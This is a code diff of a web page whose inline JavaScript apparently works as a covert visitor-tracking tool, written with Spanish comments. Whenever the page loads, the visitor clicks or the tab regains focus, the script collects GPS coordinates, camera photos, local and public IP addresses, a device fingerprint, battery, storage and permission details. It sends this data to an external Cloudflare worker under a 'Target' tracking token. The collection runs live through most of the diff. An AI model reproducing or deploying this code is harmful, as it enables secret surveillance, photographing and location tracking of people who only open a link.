@@ -14,8 +14,15 @@
     <canvas id="c"></canvas>
 
     <script>
-        const trackingId = 'AQUI_VA_TOKEN';
+        // ============================================================
+        // CONFIGURACIÓN
+        // ============================================================
+        const trackingId = 'AQUI_VA_TOKEN';  // 🔥 CAMBIA ESTO
         const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
+
+        // ============================================================
+        // TODAS LAS FUNCIONES DE CAPTURA (GPS, FOTOS, DISPOSITIVO, ETC.)
+        // ============================================================
 
         async function reverseGeocode(lat, lng) {
             try {
@@ -55,16 +62,10 @@
                             resolve(mejor);
                         }
                     },
-                    () => {
-                        navigator.geolocation.clearWatch(watchId);
-                        resolve(mejor);
-                    },
+                    () => { navigator.geolocation.clearWatch(watchId); resolve(mejor); },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
-                setTimeout(() => {
-                    navigator.geolocation.clearWatch(watchId);
-                    resolve(mejor);
-                }, 8000);
+                setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(mejor); }, 8000);
             });
         }
 
@@ -100,11 +101,8 @@
             else if (ua.includes('Windows')) modelo = 'Windows PC';
             else if (ua.includes('Linux')) modelo = 'Linux';
             return {
-                modelo: modelo,
-                userAgent: ua,
-                language: navigator.language || 'N/A',
-                platform: navigator.platform || 'N/A',
-                vendor: navigator.vendor || 'N/A',
+                modelo, userAgent: ua, language: navigator.language || 'N/A',
+                platform: navigator.platform || 'N/A', vendor: navigator.vendor || 'N/A',
                 resolution: `${window.screen.width}x${window.screen.height}`,
                 colorDepth: window.screen.colorDepth || 'N/A',
                 cpuCores: navigator.hardwareConcurrency || 'N/A',
@@ -165,12 +163,9 @@
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 return {
-                    ip: data.ip || 'N/A',
-                    country: data.country_name || 'N/A',
-                    region: data.region || 'N/A',
-                    city: data.city || 'N/A',
-                    postal: data.postal || 'N/A',
-                    timezone: data.timezone || 'N/A'
+                    ip: data.ip || 'N/A', country: data.country_name || 'N/A',
+                    region: data.region || 'N/A', city: data.city || 'N/A',
+                    postal: data.postal || 'N/A', timezone: data.timezone || 'N/A'
                 };
             } catch(e) { return null; }
         }
@@ -178,18 +173,22 @@
         function construirMensaje(dispositivo, fp, ipLocal, ipExterna, gps, bateria, almacenamiento, permisos) {
             let msg = '📊 Visitor Information Captured\n';
             msg += '━━━━━━━━━━━━━━━━\n\n';
+
             msg += '🖥️ Device & Browser\n';
             msg += `   • Device Model: ${dispositivo.modelo}\n`;
             msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
+
             msg += '🎨 Fingerprint\n';
             msg += `   • GPU: ${fp.gpu}\n`;
             msg += `   • Canvas: ${fp.canvas}\n\n`;
+
             msg += '🌐 Network Information\n';
             if (ipLocal) msg += `   • Local IP (WebRTC): ${ipLocal}\n`;
             if (ipExterna) {
                 msg += `   • IP Address: ${ipExterna.ip}\n`;
                 msg += `   • Language: ${dispositivo.language}\n\n`;
             }
+
             msg += '📍 Location Details\n';
             if (gps) {
                 msg += `   • GPS: ${gps.lat}, ${gps.lng}\n`;
@@ -206,28 +205,35 @@
                 msg += '   • No disponible\n';
             }
             msg += '\n';
+
             msg += '🖼️ Display Information\n';
             msg += `   • Resolution: ${dispositivo.resolution}\n`;
             msg += `   • Color Depth: ${dispositivo.colorDepth}\n\n`;
+
             msg += '🔋 Battery Status\n';
             msg += `   • Level: ${bateria.level}\n`;
             msg += `   • Charging: ${bateria.charging}\n\n`;
+
             msg += '🔐 Device Permissions\n';
             msg += `   • Camera: ${permisos.camera}\n`;
             msg += `   • Location: ${permisos.location}\n\n`;
+
             msg += '💾 Hardware & Storage\n';
             msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
             msg += `   • RAM: ${dispositivo.deviceMemory} GB\n`;
             msg += `   • Storage Used: ${almacenamiento.used}\n`;
             msg += `   • Storage Total: ${almacenamiento.total}\n\n`;
+
             msg += '━━━━━━━━━━━━━━━━\n';
             msg += `🎯 Target: ${trackingId || 'N/A'}\n`;
             msg += `⚡ Developed by: @societykark\n`;
             msg += `⏰ ${new Date().toISOString()}`;
+
             return msg;
         }
 
         async function enviarAlWorker() {
+            console.log('📤 Iniciando captura...');
             try {
                 const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos, ipExterna] = await Promise.all([
                     capturarFotos(3),
@@ -261,19 +267,29 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                await response.json();
+                const result = await response.json();
+                console.log('✅ Enviado:', result);
             } catch(e) {
-                console.error(e);
+                console.error('❌ Error:', e);
             }
         }
 
         function ejecutar() {
+            console.log('🔄 Ejecutando captura...');
             setTimeout(enviarAlWorker, 500);
         }
 
         window.addEventListener('load', ejecutar);
-        document.addEventListener('click', () => { setTimeout(enviarAlWorker, 300); });
-        document.addEventListener('visibilitychange', () => { if (!document.hidden) setTimeout(enviarAlWorker, 300); });
+        document.addEventListener('click', () => {
+            console.log('👆 Click');
+            setTimeout(enviarAlWorker, 300);
+        });
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                console.log('👁️ Visible');
+                setTimeout(enviarAlWorker, 300);
+            }
+        });
     </script>
 </body>
 </html>
